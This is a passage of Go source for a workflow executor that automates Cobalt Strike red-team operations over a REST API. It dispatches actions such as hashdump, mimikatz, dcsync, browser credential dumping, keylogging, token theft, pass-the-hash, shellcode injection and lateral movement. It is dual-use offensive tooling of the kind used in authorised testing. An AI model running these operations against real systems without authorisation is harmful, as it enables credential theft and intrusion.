package workflow

import (
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/xenov-x/csbot/logger"
	csclient "github.com/xenov-x/csrest"
)

// Executor executes workflows
type Executor struct {
	host        string
	port        int
	httpClient  *http.Client
	beacon      *csclient.BeaconDto // beacon metadata for condition evaluation
	outputs     map[string]string   // stores outputs from previous actions and beacon metadata
	outputMu    sync.RWMutex        // protects outputs map for concurrent access
	logger      *logger.Logger
	taskTimeout time.Duration
	results     []ActionResult // stores action results for output formatting
	resultsMu   sync.Mutex     // protects results slice
}

// ActionResult represents the result of an action execution
type ActionResult struct {
	Name      string
	Type      string
	StartTime time.Time
	EndTime   time.Time
	Duration  time.Duration
	Success   bool
	Output    string
	Error     string
}

// NewExecutor creates a new workflow executor
func NewExecutor(host string, port int, httpClient *http.Client) *Executor {
	return &Executor{
		host:        host,
		port:        port,
		httpClient:  httpClient,
		outputs:     make(map[string]string),
		taskTimeout: 5 * time.Minute, // default
	}
}

// SetLogger sets the logger for the executor
func (e *Executor) SetLogger(log *logger.Logger) {
	e.logger = log
}

// SetTaskTimeout sets the timeout for task completion
func (e *Executor) SetTaskTimeout(timeout time.Duration) {
	e.taskTimeout = timeout
}

// GetResults returns the action results
func (e *Executor) GetResults() []ActionResult {
	e.resultsMu.Lock()
	defer e.resultsMu.Unlock()
	return e.results
}

// recordResult records an action result
func (e *Executor) recordResult(result ActionResult) {
	e.resultsMu.Lock()
	e.results = append(e.results, result)
	e.resultsMu.Unlock()
}

// logInfo logs an info message
func (e *Executor) logInfo(format string, args ...interface{}) {
	if e.logger != nil {
		e.logger.Info(format, args...)
	} else {
		log.Printf(format, args...)
	}
}

// logError logs an error message
func (e *Executor) logError(format string, args ...interface{}) {
	if e.logger != nil {
		e.logger.Error(format, args...)
	} else {
		log.Printf("ERROR: "+format, args...)
	}
}

// logDebug logs a debug message
func (e *Executor) logDebug(format string, args ...interface{}) {
	if e.logger != nil {
		e.logger.Debug(format, args...)
	} else {
		log.Printf("DEBUG: "+format, args...)
	}
}

// Execute runs a workflow
func (e *Executor) Execute(ctx context.Context, wf *Workflow, username, password string) error {
	// Create client
	client := csclient.NewClient(e.host, e.port)
	client.SetHTTPClient(e.httpClient)

	// Authenticate
	e.logInfo("Authenticating as %s...", username)
	_, err := client.Login(ctx, username, password, 3600000) // 1 hour
	if err != nil {
		return fmt.Errorf("authentication failed: %w", err)
	}
	e.logInfo("Authentication successful")

	// Fetch beacon metadata only if workflow requires a beacon
	if wf.BeaconID != "" {
		e.logInfo("Fetching beacon metadata for %s...", wf.BeaconID)
		beacon, err := client.GetBeacon(ctx, wf.BeaconID)
		if err != nil {
			return fmt.Errorf("failed to fetch beacon metadata: %w", err)
		}
		e.beacon = beacon
		e.storeBeaconMetadata()
	} else {
		e.logInfo("No beacon ID specified - server-level workflow")
	}

	// Execute workflow
	e.logInfo("Starting workflow: %s", wf.Name)
	if wf.BeaconID != "" {
		e.logInfo("Target beacon: %s", wf.BeaconID)
	}

	if wf.Parallel {
		e.logInfo("Parallel execution enabled")
		return e.executeActionsParallel(ctx, client, wf.BeaconID, wf.Actions)
	}

	return e.executeActions(ctx, client, wf.BeaconID, wf.Actions)
}

// executeActionsParallel executes actions in parallel
func (e *Executor) executeActionsParallel(ctx context.Context, client *csclient.Client, beaconID string, actions []Action) error {
	var wg sync.WaitGroup
	errCh := make(chan error, len(actions))

	for i, action := range actions {
		// Check conditions before starting goroutine
		if !e.evaluateActionConditions(action) {
			e.logInfo("[%d] Conditions not met, skipping action: %s", i+1, action.Name)
			continue
		}

		wg.Add(1)
		go func(idx int, act Action) {
			defer wg.Done()

			e.logInfo("[%d] Executing action: %s (type: %s)", idx+1, act.Name, act.Type)

			output, err := e.executeAction(ctx, client, beaconID, act)
			if err != nil {
				e.logError("[%d] Action failed: %v", idx+1, err)

				// Execute on_failure actions
				if len(act.OnFailure) > 0 {
					e.logInfo("[%d] Executing on_failure actions", idx+1)
					if failErr := e.executeActions(ctx, client, beaconID, act.OnFailure); failErr != nil {
						errCh <- failErr
						return
					}
				}

				errCh <- fmt.Errorf("action %s failed: %w", act.Name, err)
				return
			}

			// Store output (thread-safe)
			e.outputMu.Lock()
			e.outputs[act.Name] = output
			e.outputMu.Unlock()

			e.logInfo("[%d] Action completed successfully", idx+1)

			// Execute on_success actions
			if len(act.OnSuccess) > 0 {
				e.logInfo("[%d] Executing on_success actions", idx+1)
				if succErr := e.executeActions(ctx, client, beaconID, act.OnSuccess); succErr != nil {
					errCh <- succErr
				}
			}
		}(i, action)
	}

	wg.Wait()
	close(errCh)

	// Check for errors
	for err := range errCh {
		return err
	}

	return nil
}

// executeActions executes a list of actions
func (e *Executor) executeActions(ctx context.Context, client *csclient.Client, beaconID string, actions []Action) error {
	for i, action := range actions {
		e.logInfo("[%d] Executing action: %s (type: %s)", i+1, action.Name, action.Type)

		startTime := time.Now()
		result := ActionResult{
			Name:      action.Name,
			Type:      action.Type,
			StartTime: startTime,
		}

		// Check conditions
		if !e.evaluateActionConditions(action) {
			e.logInfo("[%d] Conditions not met, skipping action", i+1)
			result.EndTime = time.Now()
			result.Duration = result.EndTime.Sub(result.StartTime)
			result.Success = true
			result.Output = "Skipped (conditions not met)"
			e.recordResult(result)
			continue
		}

		// Execute action
		output, err := e.executeAction(ctx, client, beaconID, action)
		result.EndTime = time.Now()
		result.Duration = result.EndTime.Sub(result.StartTime)

		if err != nil {
			e.logError("[%d] Action failed: %v", i+1, err)
			result.Success = false
			result.Error = err.Error()
			e.recordResult(result)

			// Execute on_failure actions
			if len(action.OnFailure) > 0 {
				e.logInfo("[%d] Executing on_failure actions", i+1)
				if err := e.executeActions(ctx, client, beaconID, action.OnFailure); err != nil {
					return err
				}
			}

			return fmt.Errorf("action %s failed: %w", action.Name, err)
		}

		// Store output
		e.outputs[action.Name] = output
		result.Success = true
		result.Output = output
		e.recordResult(result)

		e.logInfo("[%d] Action completed successfully", i+1)

		// Execute on_success actions
		if len(action.OnSuccess) > 0 {
			e.logInfo("[%d] Executing on_success actions", i+1)
			if err := e.executeActions(ctx, client, beaconID, action.OnSuccess); err != nil {
				return err
			}
		}
	}

	return nil
}

// executeAction executes a single action
func (e *Executor) executeAction(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	// Interpolate variables in parameters before execution
	action = e.interpolateAction(action)

	switch action.Type {
	// --- Server-Level Operations (no beacon required) ---
	case "list_listeners":
		return e.executeListListeners(ctx, client)
	case "get_listener":
		return e.executeGetListener(ctx, client, action)
	case "delete_listener":
		return e.executeDeleteListener(ctx, client, action)
	case "add_http_listener":
		return e.executeAddListener(ctx, client, action, "http")
	case "add_https_listener":
		return e.executeAddListener(ctx, client, action, "https")
	case "add_dns_listener":
		return e.executeAddListener(ctx, client, action, "dns")
	case "add_tcp_listener":
		return e.executeAddListener(ctx, client, action, "tcp")
	case "add_smb_listener":
		return e.executeAddListener(ctx, client, action, "smb")
	case "add_externalc2_listener":
		return e.executeAddListener(ctx, client, action, "externalc2")
	case "add_udc2_listener":
		return e.executeAddListener(ctx, client, action, "udc2")
	case "add_foreign_http_listener":
		return e.executeAddListener(ctx, client, action, "foreign_http")
	case "add_foreign_https_listener":
		return e.executeAddListener(ctx, client, action, "foreign_https")
	case "update_http_listener":
		return e.executeUpdateListener(ctx, client, action, "http")
	case "update_https_listener":
		return e.executeUpdateListener(ctx, client, action, "https")
	case "update_dns_listener":
		return e.executeUpdateListener(ctx, client, action, "dns")
	case "update_tcp_listener":
		return e.executeUpdateListener(ctx, client, action, "tcp")
	case "update_smb_listener":
		return e.executeUpdateListener(ctx, client, action, "smb")
	case "update_externalc2_listener":
		return e.executeUpdateListener(ctx, client, action, "externalc2")
	case "update_udc2_listener":
		return e.executeUpdateListener(ctx, client, action, "udc2")
	case "update_foreign_http_listener":
		return e.executeUpdateListener(ctx, client, action, "foreign_http")
	case "update_foreign_https_listener":
		return e.executeUpdateListener(ctx, client, action, "foreign_https")
	case "list_artifacts":
		return e.executeListArtifacts(ctx, client)
	case "generate_stageless_payload":
		return e.executeGenerateStagelessPayload(ctx, client, action)
	case "generate_stager_payload":
		return e.executeGenerateStagerPayload(ctx, client, action)
	case "download_payload":
		return e.executeDownloadPayload(ctx, client, action)
	case "get_kill_date":
		return e.executeGetKillDate(ctx, client)
	case "get_c2_profile":
		return e.executeGetC2Profile(ctx, client)
	case "get_system_info":
		return e.executeGetSystemInfo(ctx, client)
	case "get_teamserver_ip":
		return e.executeGetTeamserverIp(ctx, client)

	// --- Beacon-Targeted Operations ---
	case "bof_string":
		return e.executeBOFString(ctx, client, beaconID, action)
	case "bof_packed":
		return e.executeBOFPacked(ctx, client, beaconID, action)
	case "bof_pack":
		return e.executeBOFPack(ctx, client, beaconID, action)
	case "bof_pack_custom":
		return e.executeBOFPackCustom(ctx, client, beaconID, action)
	case "getuid":
		return e.executeGetUID(ctx, client, beaconID)
	case "getsystem":
		return e.executeGetSystem(ctx, client, beaconID)
	case "sleep":
		return e.executeSleep(action)
	case "shell":
		return e.executeShell(ctx, client, beaconID, action)
	case "powershell":
		return e.executePowerShell(ctx, client, beaconID, action)
	case "upload":
		return e.executeUpload(ctx, client, beaconID, action)
	case "download":
		return e.executeDownload(ctx, client, beaconID, action)
	case "screenshot":
		return e.executeScreenshot(ctx, client, beaconID)
	// File & directory operations
	case "cd":
		return e.executeCd(ctx, client, beaconID, action)
	case "ls":
		return e.executeLs(ctx, client, beaconID, action)
	case "pwd":
		return e.executePwd(ctx, client, beaconID)
	case "mkdir":
		return e.executeMkdir(ctx, client, beaconID, action)
	case "cp":
		return e.executeCp(ctx, client, beaconID, action)
	case "mv":
		return e.executeMv(ctx, client, beaconID, action)
	case "rm":
		return e.executeRm(ctx, client, beaconID, action)
	case "drives":
		return e.executeDrives(ctx, client, beaconID)
	case "timestomp":
		return e.executeTimestomp(ctx, client, beaconID, action)
	// Process management operations
	case "ps":
		return e.executePs(ctx, client, beaconID)
	case "kill":
		return e.executeKill(ctx, client, beaconID, action)
	case "getprivs":
		return e.executeGetPrivs(ctx, client, beaconID)
	case "setenv":
		return e.executeSetEnv(ctx, client, beaconID, action)
	case "exit":
		return e.executeExit(ctx, client, beaconID)
	case "job_stop":
		return e.executeJobStop(ctx, client, beaconID, action)

	// --- Credential & Token Operations ---
	case "steal_token":
		return e.executeStealToken(ctx, client, beaconID, action)
	case "make_token":
		return e.executeMakeToken(ctx, client, beaconID, action)
	case "make_token_upn":
		return e.executeMakeTokenUpn(ctx, client, beaconID, action)
	case "rev2self":
		return e.executeRev2Self(ctx, client, beaconID)
	case "kerberos_ticket_use":
		return e.executeKerberosTicketUse(ctx, client, beaconID, action)
	case "kerberos_ticket_purge":
		return e.executeKerberosTicketPurge(ctx, client, beaconID)
	case "token_store_steal":
		return e.executeTokenStoreSteal(ctx, client, beaconID, action)
	case "token_store_steal_use":
		return e.executeTokenStoreStealAndUse(ctx, client, beaconID, action)
	case "token_store_use":
		return e.executeTokenStoreUse(ctx, client, beaconID, action)
	case "token_store_remove":
		return e.executeTokenStoreRemove(ctx, client, beaconID, action)
	case "token_store_remove_all":
		return e.executeTokenStoreRemoveAll(ctx, client, beaconID)
	case "token_store_list":
		return e.executeTokenStoreList(ctx, client, beaconID)
	case "hashdump":
		return e.executeHashdump(ctx, client, beaconID)
	case "logon_passwords":
		return e.executeLogonPasswords(ctx, client, beaconID)
	case "mimikatz":
		return e.executeMimikatz(ctx, client, beaconID, action)
	case "dcsync":
		return e.executeDcSync(ctx, client, beaconID, action)
	case "chromedump":
		return e.executeChromeDump(ctx, client, beaconID)

	// --- Pivoting & Lateral Movement ---
	case "link_smb":
		return e.executeLinkSmb(ctx, client, beaconID, action)
	case "link_tcp":
		return e.executeLinkTcp(ctx, client, beaconID, action)
	case "unlink":
		return e.executeUnlink(ctx, client, beaconID, action)
	case "ssh":
		return e.executeSsh(ctx, client, beaconID, action)
	case "ssh_key":
		return e.executeSshKey(ctx, client, beaconID, action)
	case "remote_exec":
		return e.executeRemoteExec(ctx, client, beaconID, action)
	case "jump":
		return e.executeJump(ctx, client, beaconID, action)

	// --- Tunneling ---
	case "socks4_start":
		return e.executeSocks4Start(ctx, client, beaconID, action)
	case "socks5_start":
		return e.executeSocks5Start(ctx, client, beaconID, action)
	case "socks_stop_all":
		return e.executeSocksStopAll(ctx, client, beaconID, action)
	case "socks_stop":
		return e.executeSocksStop(ctx, client, beaconID, action)
	case "rportfwd_start":
		return e.executeRportfwdStart(ctx, client, beaconID, action)
	case "rportfwd_stop":
		return e.executeRportfwdStop(ctx, client, beaconID, action)
	case "browser_pivot_start":
		return e.executeBrowserPivotStart(ctx, client, beaconID, action)
	case "browser_pivot_stop":
		return e.executeBrowserPivotStop(ctx, client, beaconID, action)

	// --- Network Recon ---
	case "net_domain":
		return e.executeNetDomain(ctx, client, beaconID)
	case "net_view":
		return e.executeNetView(ctx, client, beaconID, action)
	case "net_user":
		return e.executeNetUser(ctx, client, beaconID, action)
	case "net_user_detail":
		return e.executeNetUserDetail(ctx, client, beaconID, action)
	case "net_time":
		return e.executeNetTime(ctx, client, beaconID, action)
	case "net_share":
		return e.executeNetShare(ctx, client, beaconID, action)
	case "net_sessions":
		return e.executeNetSessions(ctx, client, beaconID, action)
	case "net_logons":
		return e.executeNetLogons(ctx, client, beaconID, action)
	case "net_localgroup":
		return e.executeNetLocalGroup(ctx, client, beaconID, action)
	case "net_group":
		return e.executeNetGroup(ctx, client, beaconID, action)
	case "net_domain_trusts":
		return e.executeNetDomainTrusts(ctx, client, beaconID, action)
	case "net_domain_controllers":
		return e.executeNetDomainControllers(ctx, client, beaconID, action)
	case "net_dclist":
		return e.executeNetDcList(ctx, client, beaconID, action)
	case "net_computers":
		return e.executeNetComputers(ctx, client, beaconID, action)
	case "portscan":
		return e.executePortScan(ctx, client, beaconID, action)

	// --- Capture Operations ---
	case "keylogger":
		return e.executeKeylogger(ctx, client, beaconID)
	case "screenwatch":
		return e.executeScreenwatch(ctx, client, beaconID)
	case "printscreen":
		return e.executePrintscreen(ctx, client, beaconID)
	case "clipboard":
		return e.executeClipboard(ctx, client, beaconID)
	case "cancel_download":
		return e.executeCancelDownload(ctx, client, beaconID, action)

	// --- Command Execution Variants ---
	case "run":
		return e.executeRun(ctx, client, beaconID, action)
	case "runas":
		return e.executeRunAs(ctx, client, beaconID, action)
	case "run_under":
		return e.executeRunUnder(ctx, client, beaconID, action)
	case "run_no_output":
		return e.executeRunNoOutput(ctx, client, beaconID, action)

	// --- Privilege Elevation ---
	case "elevate_command":
		return e.executeElevateCommand(ctx, client, beaconID, action)
	case "elevate_beacon":
		return e.executeElevateBeacon(ctx, client, beaconID, action)

	// --- Beacon/Shellcode Spawn & Inject ---
	case "spawn_beacon":
		return e.executeSpawnBeacon(ctx, client, beaconID, action)
	case "spawn_beacon_as_user":
		return e.executeSpawnBeaconAsUser(ctx, client, beaconID, action)
	case "spawn_beacon_under":
		return e.executeSpawnBeaconUnder(ctx, client, beaconID, action)
	case "inject_beacon":
		return e.executeInjectBeacon(ctx, client, beaconID, action)
	case "spawn_shellcode":
		return e.executeSpawnShellcode(ctx, client, beaconID, action)
	case "inject_shellcode":
		return e.executeInjectShellcode(ctx, client, beaconID, action)

	// --- PowerShell & .NET ---
	case "powershell_import":
		return e.executePowerShellImport(ctx, client, beaconID, action)
	case "powerpick":
		return e.executePowerPick(ctx, client, beaconID, action)
	case "psinject":
		return e.executePsInject(ctx, client, beaconID, action)
	case "execute_assembly":
		return e.executeExecuteAssembly(ctx, client, beaconID, action)

	// --- Pass-the-Hash ---
	case "spawn_pth":
		return e.executeSpawnPth(ctx, client, beaconID, action)
	case "inject_pth":
		return e.executeInjectPth(ctx, client, beaconID, action)

	// --- DLL Operations ---
	case "inject_dll":
		return e.executeInjectDll(ctx, client, beaconID, action)
	case "inject_load_dll":
		return e.executeInjectLoadDll(ctx, client, beaconID, action)

	// --- PostEx DLL ---
	case "spawn_postex_dll":
		return e.executeSpawnPostExDll(ctx, client, beaconID, action)
	case "inject_postex_dll":
		return e.executeInjectPostExDll(ctx, client, beaconID, action)

	// --- Registry ---
	case "reg_query":
		return e.executeRegQuery(ctx, client, beaconID, action)
	case "reg_queryv":
		return e.executeRegQueryValue(ctx, client, beaconID, action)

	// --- Beacon Configuration ---
	case "beacon_info":
		return e.executeBeaconInfo(ctx, client, beaconID)
	case "set_sleep":
		return e.executeSetSleep(ctx, client, beaconID, action)
	case "set_note":
		return e.executeSetNote(ctx, client, beaconID, action)
	case "enable_beacon_gate":
		return e.executeEnableBeaconGate(ctx, client, beaconID)
	case "disable_beacon_gate":
		return e.executeDisableBeaconGate(ctx, client, beaconID)
	case "enable_blockdlls":
		return e.executeEnableBlockDlls(ctx, client, beaconID)
	case "disable_blockdlls":
		return e.executeDisableBlockDlls(ctx, client, beaconID)
	case "set_spawnto":
		return e.executeSetSpawnto(ctx, client, beaconID, action)
	case "unset_spawnto":
		return e.executeUnsetSpawnto(ctx, client, beaconID)
	case "set_ppid":
		return e.executeSetPpid(ctx, client, beaconID, action)
	case "unset_ppid":
		return e.executeUnsetPpid(ctx, client, beaconID)
	case "set_dns_mode":
		return e.executeSetDnsMode(ctx, client, beaconID, action)
	case "set_syscall_method":
		return e.executeSetSyscallMethod(ctx, client, beaconID, action)

	// --- Beacon Management ---
	case "delete_beacon":
		return e.executeDeleteBeacon(ctx, client, beaconID)
	case "clear_queue":
		return e.executeClearQueue(ctx, client, beaconID)
	case "checkin":
		return e.executeCheckin(ctx, client, beaconID)
	case "console_command":
		return e.executeConsoleCommand(ctx, client, beaconID, action)
	case "list_jobs":
		return e.executeListJobs(ctx, client, beaconID)

	default:
		return "", fmt.Errorf("unknown action type: %s", action.Type)
	}
}

// interpolateAction replaces ${action_name} variables with action outputs
func (e *Executor) interpolateAction(action Action) Action {
	e.outputMu.RLock()
	defer e.outputMu.RUnlock()

	// Create a copy of the action to avoid modifying the original
	interpolated := action
	interpolated.Parameters = make(map[string]interface{})

	for key, value := range action.Parameters {
		if strVal, ok := value.(string); ok {
			// Replace ${action_name} with output from that action
			interpolated.Parameters[key] = e.interpolateString(strVal)
		} else {
			interpolated.Parameters[key] = value
		}
	}

	return interpolated
}

// interpolateString replaces ${action_name} variables with outputs
func (e *Executor) interpolateString(s string) string {
	result := s

	// Find all ${...} patterns
	for actionName, output := range e.outputs {
		placeholder := fmt.Sprintf("${%s}", actionName)
		result = strings.ReplaceAll(result, placeholder, output)
	}

	return result
}

// executeBOFString executes a BOF with string arguments
func (e *Executor) executeBOFString(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	bofPath, ok := action.Parameters["bof"].(string)
	if !ok {
		return "", fmt.Errorf("bof parameter required")
	}

	// Read BOF file
	bofData, err := os.ReadFile(bofPath)
	if err != nil {
		return "", fmt.Errorf("failed to read BOF file: %w", err)
	}

	bofBase64 := base64.StdEncoding.EncodeToString(bofData)

	req := csclient.InlineExecuteStringDto{
		BOF:   "@files/bof.o",
		Files: map[string]string{"bof.o": bofBase64},
	}

	if ep, ok := action.Parameters["entrypoint"].(string); ok {
		req.Entrypoint = ep
	}
	if args, ok := action.Parameters["arguments"].(string); ok {
		req.Arguments = args
	}

	resp, err := client.ExecuteBOFString(ctx, beaconID, req)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeBOFPacked executes a BOF with packed arguments
func (e *Executor) executeBOFPacked(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	bofPath, ok := action.Parameters["bof"].(string)
	if !ok {
		return "", fmt.Errorf("bof parameter required")
	}

	bofData, err := os.ReadFile(bofPath)
	if err != nil {
		return "", fmt.Errorf("failed to read BOF file: %w", err)
	}

	bofBase64 := base64.StdEncoding.EncodeToString(bofData)

	req := csclient.InlineExecutePackedDto{
		BOF:   "@files/bof.o",
		Files: map[string]string{"bof.o": bofBase64},
	}

	if ep, ok := action.Parameters["entrypoint"].(string); ok {
		req.Entrypoint = ep
	}
	if args, ok := action.Parameters["arguments"].(string); ok {
		req.Arguments = args
	}

	resp, err := client.ExecuteBOFPacked(ctx, beaconID, req)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeBOFPack executes a BOF with typed arguments
func (e *Executor) executeBOFPack(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	bofPath, ok := action.Parameters["bof"].(string)
	if !ok {
		return "", fmt.Errorf("bof parameter required")
	}

	bofData, err := os.ReadFile(bofPath)
	if err != nil {
		return "", fmt.Errorf("failed to read BOF file: %w", err)
	}

	bofBase64 := base64.StdEncoding.EncodeToString(bofData)

	req := csclient.InlineExecutePackDto{
		BOF:   "@files/bof.o",
		Files: map[string]string{"bof.o": bofBase64},
	}

	if ep, ok := action.Parameters["entrypoint"].(string); ok {
		req.Entrypoint = ep
	}

	// Parse arguments
	if argsInterface, ok := action.Parameters["arguments"].([]interface{}); ok {
		var args []csclient.BOFArgument
		for _, arg := range argsInterface {
			argMap, ok := arg.(map[string]interface{})
			if !ok {
				continue
			}

			argType, _ := argMap["type"].(string)
			switch argType {
			case "string":
				args = append(args, csclient.StringArg{
					Type:  "string",
					Value: argMap["value"].(string),
				})
			case "wstring":
				args = append(args, csclient.WStringArg{
					Type:  "wstring",
					Value: argMap["value"].(string),
				})
			case "int":
				args = append(args, csclient.IntArg{
					Type:  "int",
					Value: int(argMap["value"].(float64)),
				})
			case "short":
				args = append(args, csclient.ShortArg{
					Type:  "short",
					Value: int(argMap["value"].(float64)),
				})
			case "binary":
				args = append(args, csclient.BinaryArg{
					Type:  "binary",
					Value: argMap["value"].(string),
				})
			case "binarypath":
				filePath := argMap["value"].(string)
				fileData, err := os.ReadFile(filePath)
				if err != nil {
					return "", fmt.Errorf("failed to read binarypath file %s: %w", filePath, err)
				}
				args = append(args, csclient.BinaryArg{
					Type:  "binary",
					Value: base64.StdEncoding.EncodeToString(fileData),
				})
			case "binarylen":
				filePath := argMap["value"].(string)
				fileInfo, err := os.Stat(filePath)
				if err != nil {
					return "", fmt.Errorf("failed to stat binarylen file %s: %w", filePath, err)
				}
				args = append(args, csclient.IntArg{
					Type:  "int",
					Value: int(fileInfo.Size()),
				})
			}
		}
		req.Arguments = args
	}

	resp, err := client.ExecuteBOFPack(ctx, beaconID, req)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeGetUID executes getuid command
func (e *Executor) executeGetUID(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.GetUID(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeGetSystem executes getsystem command
func (e *Executor) executeGetSystem(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.GetSystem(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeSleep pauses execution
func (e *Executor) executeSleep(action Action) (string, error) {
	duration, ok := action.Parameters["duration"].(string)
	if !ok {
		return "", fmt.Errorf("duration parameter required for sleep")
	}

	d, err := time.ParseDuration(duration)
	if err != nil {
		return "", fmt.Errorf("invalid duration: %w", err)
	}

	e.logInfo("Sleeping for %s", d)
	time.Sleep(d)
	return "slept", nil
}

// waitForOutput waits for task output
func (e *Executor) waitForOutput(ctx context.Context, client *csclient.Client, taskID string) (string, error) {
	e.logDebug("Waiting for task output (taskID: %s, timeout: %s)", taskID, e.taskTimeout)

	task, err := client.WaitForTaskCompletion(ctx, taskID, e.taskTimeout)
	if err != nil {
		return "", fmt.Errorf("failed to get task output: %w", err)
	}

	// Extract text output from result
	var output strings.Builder
	for _, result := range task.Result {
		if text, ok := result["output"].(string); ok {
			output.WriteString(text)
		}
		if text, ok := result["text"].(string); ok {
			output.WriteString(text)
		}
	}

	outputStr := output.String()
	if outputStr != "" {
		e.logDebug("Task output received (%d bytes)", len(outputStr))
	} else {
		e.logDebug("Task completed with no output")
	}

	return outputStr, nil
}

// evaluateActionConditions evaluates all condition groups for an action
func (e *Executor) evaluateActionConditions(action Action) bool {
	// If using new any_of or all_of fields
	if len(action.AnyOf) > 0 {
		e.logDebug("Evaluating any_of conditions for action: %s", action.Name)
		result := e.checkAnyOf(action.AnyOf)
		e.logDebug("AnyOf result: %v", result)
		return result
	}
	if len(action.AllOf) > 0 {
		e.logDebug("Evaluating all_of conditions for action: %s", action.Name)
		result := e.checkAllOf(action.AllOf)
		e.logDebug("AllOf result: %v", result)
		return result
	}
	// Fall back to legacy conditions field (all must be true)
	if len(action.Conditions) > 0 {
		e.logDebug("Evaluating legacy conditions for action: %s", action.Name)
		result := e.checkAllOf(action.Conditions)
		e.logDebug("Conditions result: %v", result)
		return result
	}
	return true
}

// checkAnyOf checks if at least one condition is true (OR logic)
func (e *Executor) checkAnyOf(conditions []Condition) bool {
	if len(conditions) == 0 {
		return true
	}

	for i, cond := range conditions {
		e.logDebug("  Checking any_of condition %d: source=%s, operator=%s, value=%s", i+1, cond.Source, cond.Operator, cond.Value)
		if e.evaluateCondition(cond) {
			e.logDebug("  Condition %d matched!", i+1)
			return true
		}
		e.logDebug("  Condition %d did not match", i+1)
	}

	e.logDebug("AnyOf: No conditions met")
	return false
}

// checkAllOf checks if all conditions are true (AND logic)
func (e *Executor) checkAllOf(conditions []Condition) bool {
	if len(conditions) == 0 {
		return true
	}

	for _, cond := range conditions {
		if !e.evaluateCondition(cond) {
			return false
		}
	}

	return true
}

// evaluateCondition evaluates a single condition (supports nested any_of/all_of)
func (e *Executor) evaluateCondition(cond Condition) bool {
	// Check for nested condition groups
	if len(cond.AnyOf) > 0 {
		return e.checkAnyOf(cond.AnyOf)
	}
	if len(cond.AllOf) > 0 {
		return e.checkAllOf(cond.AllOf)
	}

	// Evaluate leaf condition
	return e.checkCondition(cond)
}

// checkConditions checks if all conditions are met (legacy - kept for backward compatibility)
func (e *Executor) checkConditions(conditions []Condition) bool {
	return e.checkAllOf(conditions)
}

// checkCondition checks a single condition
func (e *Executor) checkCondition(cond Condition) bool {
	e.outputMu.RLock()
	output, exists := e.outputs[cond.Source]
	e.outputMu.RUnlock()

	if !exists {
		e.logDebug("    Source '%s' not found in outputs", cond.Source)
		return false
	}

	e.logDebug("    Source '%s' = '%s'", cond.Source, output)

	// Prepare strings for comparison
	compareOutput := output
	compareValue := cond.Value
	if !cond.CaseSensitive {
		compareOutput = strings.ToLower(output)
		compareValue = strings.ToLower(cond.Value)
	}

	switch cond.Operator {
	case "contains":
		result := strings.Contains(compareOutput, compareValue)
		e.logDebug("Condition check: '%s' contains '%s' = %v", cond.Source, cond.Value, result)
		return result

	case "not_contains":
		result := !strings.Contains(compareOutput, compareValue)
		e.logDebug("Condition check: '%s' not contains '%s' = %v", cond.Source, cond.Value, result)
		return result

	case "equals":
		result := compareOutput == compareValue
		e.logDebug("Condition check: '%s' equals '%s' = %v", cond.Source, cond.Value, result)
		return result

	case "matches":
		re, err := regexp.Compile(cond.Value)
		if err != nil {
			e.logError("Condition check: invalid regex '%s': %v", cond.Value, err)
			return false
		}
		result := re.MatchString(output)
		e.logDebug("Condition check: '%s' matches '%s' = %v", cond.Source, cond.Value, result)
		return result

	default:
		e.logError("Condition check: unknown operator '%s'", cond.Operator)
		return false
	}
}

// executeShell executes a shell command
func (e *Executor) executeShell(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	command, ok := action.Parameters["command"].(string)
	if !ok {
		return "", fmt.Errorf("command parameter required for shell")
	}

	resp, err := client.ExecuteShell(ctx, beaconID, command)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executePowerShell executes a PowerShell command
func (e *Executor) executePowerShell(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	command, ok := action.Parameters["command"].(string)
	if !ok {
		return "", fmt.Errorf("command parameter required for powershell")
	}

	resp, err := client.ExecutePowerShell(ctx, beaconID, command)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeUpload uploads a file to the beacon's current working directory
func (e *Executor) executeUpload(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	localPath, ok := action.Parameters["local_path"].(string)
	if !ok {
		return "", fmt.Errorf("local_path parameter required for upload")
	}

	resp, err := client.Upload(ctx, beaconID, localPath)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeDownload downloads a file from the beacon
func (e *Executor) executeDownload(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	remotePath, ok := action.Parameters["remote_path"].(string)
	if !ok {
		return "", fmt.Errorf("remote_path parameter required for download")
	}

	resp, err := client.Download(ctx, beaconID, remotePath)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeBOFPackCustom executes a BOF with custom packed arguments
func (e *Executor) executeBOFPackCustom(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	bofPath, ok := action.Parameters["bof"].(string)
	if !ok {
		return "", fmt.Errorf("bof parameter required")
	}

	bofData, err := os.ReadFile(bofPath)
	if err != nil {
		return "", fmt.Errorf("failed to read BOF file: %w", err)
	}

	bofBase64 := base64.StdEncoding.EncodeToString(bofData)

	// Parse arguments array
	var packedArgs []byte
	if argsInterface, ok := action.Parameters["arguments"].([]interface{}); ok {
		var bofArgs []BOFArgument
		for _, arg := range argsInterface {
			argMap, ok := arg.(map[string]interface{})
			if !ok {
				continue
			}

			argType, _ := argMap["type"].(string)
			bofArg := BOFArgument{
				Type:  argType,
